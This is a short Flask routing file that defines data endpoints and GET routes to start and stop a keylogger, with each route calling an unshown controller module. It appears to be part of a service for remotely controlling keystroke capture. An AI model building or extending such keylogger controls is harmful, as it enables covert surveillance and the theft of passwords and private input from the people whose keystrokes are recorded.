from flask import Blueprint
import controller

router = Blueprint('router', __name__)

@router.route('/data', methods=['GET'])
def get_data():
    return controller.get_data()

@router.route('/data', methods=['POST'])
def add_data():
    return controller.add_data()

@router.route('/start_keylogger', methods=['GET'])
def start_keylogger():
    return controller.start_keylogger()

@router.route('/stop_keylogger', methods=['GET'])
def stop_keylogger():
    return controller.stop_keylogger()